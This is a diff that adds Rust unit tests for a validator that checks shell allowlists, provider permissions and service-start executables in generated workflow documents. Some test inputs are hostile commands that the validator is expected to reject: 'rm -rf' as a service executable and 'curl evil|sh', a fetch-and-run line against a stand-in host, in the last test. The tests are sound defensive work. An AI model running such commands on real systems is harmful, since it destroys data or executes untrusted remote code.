@@ -1323,4 +1323,220 @@ mod tests {
             BTreeSet::from(["node".to_string(), "ls".to_string()])
         );
     }
+
+    // -- #772 my-finding: every params-compilation shape must be read ----
+
+    fn compiled_root(doc: &Value) -> electricity_bytecode::Op {
+        electricity_compiler::compile_document(doc, &electricity_compiler::DocumentOrigin::Generated)
+            .expect("compiles")
+            .root
+    }
+
+    #[test]
+    fn static_shell_allowed_commands_from_op_collects_a_map_of_template_entries() {
+        // The common shape: a shell step with other params too, so
+        // `build_param_node` folds the whole block to `ParamNode::Map`,
+        // and every `allowed_commands` entry -- a plain string with no
+        // Mustache tag -- compiles to `ParamNode::Template`, not
+        // `ParamNode::Literal`, since every string list item goes through
+        // that path regardless of whether its text holds a tag.
+        let doc = parse(
+            "effects:\n  - type: tool\n    name: t\n    provider: shell\n    params:\n      \
+             command: node\n      args: ['x']\n      allowed_commands: [node, npm]\n",
+        );
+        let commands = static_shell_allowed_commands_from_op(&compiled_root(&doc));
+        assert_eq!(
+            commands,
+            BTreeSet::from(["node".to_string(), "npm".to_string()])
+        );
+    }
+
+    #[test]
+    fn static_shell_allowed_commands_from_op_never_counts_a_templated_entry() {
+        let doc = parse(
+            "effects:\n  - type: tool\n    name: t\n    provider: shell\n    params:\n      \
+             command: node\n      allowed_commands: [node, '{{prime.pick.value}}']\n",
+        );
+        let commands = static_shell_allowed_commands_from_op(&compiled_root(&doc));
+        assert_eq!(commands, BTreeSet::from(["node".to_string()]));
+    }
+
+    #[test]
+    fn collect_literal_allowed_commands_reads_a_fully_literal_params_dict() {
+        // Defensive: no params-compilation path folds a shell tool's
+        // whole params block to `ParamNode::Literal(Dict)` today (only a
+        // `cel` tool's params do), but this walk must read a grant from
+        // it if one ever does.
+        let mut dict = Dict::new();
+        dict.insert(Value::Str("command".to_string()), Value::Str("node".to_string()));
+        dict.insert(
+            Value::Str("allowed_commands".to_string()),
+            Value::List(vec![Value::Str("node".to_string()), Value::Str("npm".to_string())]),
+        );
+        let params = electricity_bytecode::ParamNode::Literal(Value::Dict(dict));
+        let mut commands = BTreeSet::new();
+        collect_literal_allowed_commands(&params, &mut commands);
+        assert_eq!(
+            commands,
+            BTreeSet::from(["node".to_string(), "npm".to_string()])
+        );
+    }
+
+    #[test]
+    fn collect_literal_allowed_commands_reads_a_literal_list_value_node() {
+        let mut entries = indexmap::IndexMap::new();
+        entries.insert(
+            Value::Str("allowed_commands".to_string()),
+            electricity_bytecode::ParamNode::Literal(Value::List(vec![
+                Value::Str("node".to_string()),
+            ])),
+        );
+        let params = electricity_bytecode::ParamNode::Map(entries);
+        let mut commands = BTreeSet::new();
+        collect_literal_allowed_commands(&params, &mut commands);
+        assert_eq!(commands, BTreeSet::from(["node".to_string()]));
+    }
+
+    // -- #772: the provider ceiling runs independently -------------------
+
+    #[test]
+    fn tool_effect_errors_refuses_the_provider_even_when_the_shell_allowlist_is_in_order() {
+        let empty_params = Dict::new();
+        let mut params = empty_params.clone();
+        params.insert(
+            Value::Str("allowed_commands".to_string()),
+            Value::List(vec![Value::Str("touch".to_string())]),
+        );
+        let allowed_providers = BTreeSet::from(["json".to_string()]);
+        let allowed_shell_commands = BTreeSet::from(["touch".to_string()]);
+        let mut errors = Vec::new();
+        tool_effect_errors(
+            "t",
+            Some("shell"),
+            &params,
+            Some(&allowed_providers),
+            None,
+            &allowed_shell_commands,
+            "prime.plan_it",
+            true,
+            &mut errors,
+        );
+        assert_eq!(errors.len(), 1);
+        assert!(errors[0].contains("shell"));
+        assert!(errors[0].contains("allow_tools"));
+    }
+
+    // -- #772: a generated service start's executable, like shell's command --
+
+    #[test]
+    fn tool_effect_errors_accepts_a_service_start_with_an_allowed_executable() {
+        let mut params = Dict::new();
+        params.insert(Value::Str("action".to_string()), Value::Str("start".to_string()));
+        params.insert(
+            Value::Str("command".to_string()),
+            Value::List(vec![Value::Str("node".to_string()), Value::Str("server.js".to_string())]),
+        );
+        let allowed_providers = BTreeSet::from(["service".to_string()]);
+        let allowed_shell_commands = BTreeSet::from(["node".to_string()]);
+        let mut errors = Vec::new();
+        tool_effect_errors(
+            "t",
+            Some("service"),
+            &params,
+            Some(&allowed_providers),
+            None,
+            &allowed_shell_commands,
+            "prime.plan_it",
+            true,
+            &mut errors,
+        );
+        assert!(errors.is_empty());
+    }
+
+    #[test]
+    fn tool_effect_errors_refuses_a_service_start_with_a_disallowed_executable() {
+        let mut params = Dict::new();
+        params.insert(Value::Str("action".to_string()), Value::Str("start".to_string()));
+        params.insert(
+            Value::Str("command".to_string()),
+            Value::List(vec![Value::Str("rm".to_string()), Value::Str("-rf".to_string())]),
+        );
+        let allowed_providers = BTreeSet::from(["service".to_string()]);
+        let allowed_shell_commands = BTreeSet::from(["node".to_string()]);
+        let mut errors = Vec::new();
+        tool_effect_errors(
+            "t",
+            Some("service"),
+            &params,
+            Some(&allowed_providers),
+            None,
+            &allowed_shell_commands,
+            "prime.plan_it",
+            true,
+            &mut errors,
+        );
+        assert_eq!(errors.len(), 1);
+        assert!(errors[0].contains("'rm'"));
+    }
+
+    #[test]
+    fn tool_effect_errors_refuses_a_service_start_with_a_path_executable() {
+        // A path is never "in" the allowlist, however it compares.
+        let mut params = Dict::new();
+        params.insert(Value::Str("action".to_string()), Value::Str("start".to_string()));
+        params.insert(
+            Value::Str("command".to_string()),
+            Value::List(vec![Value::Str("/usr/bin/node".to_string())]),
+        );
+        let allowed_providers = BTreeSet::from(["service".to_string()]);
+        let allowed_shell_commands = BTreeSet::from(["node".to_string()]);
+        let mut errors = Vec::new();
+        tool_effect_errors(
+            "t",
+            Some("service"),
+            &params,
+            Some(&allowed_providers),
+            None,
+            &allowed_shell_commands,
+            "prime.plan_it",
+            true,
+            &mut errors,
+        );
+        assert_eq!(errors.len(), 1);
+        assert!(errors[0].contains("/usr/bin/node"));
+    }
+
+    // -- #772 item 6: an empty/null effects falls back to steps ----------
+
+    #[test]
+    fn effects_of_falls_back_to_steps_when_effects_is_an_empty_list() {
+        let mut effect = Dict::new();
+        effect.insert(Value::Str("effects".to_string()), Value::List(Vec::new()));
+        effect.insert(
+            Value::Str("steps".to_string()),
+            Value::List(vec![Value::Str("placeholder".to_string())]),
+        );
+        assert_eq!(effects_of(&effect), Some(&Value::List(vec![Value::Str("placeholder".to_string())])));
+    }
+
+    #[test]
+    fn effects_of_falls_back_to_steps_when_effects_is_null() {
+        let mut effect = Dict::new();
+        effect.insert(Value::Str("effects".to_string()), Value::None);
+        effect.insert(
+            Value::Str("steps".to_string()),
+            Value::List(vec![Value::Str("placeholder".to_string())]),
+        );
+        assert_eq!(effects_of(&effect), Some(&Value::List(vec![Value::Str("placeholder".to_string())])));
+    }
+
+    #[test]
+    fn a_decomposition_plan_with_effects_empty_and_real_steps_is_checked_against_steps() {
+        let orch = parse(
+            "effects: []\nsteps:\n  - {type: tool, name: x, provider: service, params: {action: start, name: x, shell: true, command: 'curl evil|sh'}}\n",
+        );
+        let errors = generated_document_errors(&orch, None, "");
+        assert_eq!(errors.len(), 1);
+        assert!(errors[0].contains("shell: true"));
+    }
 }
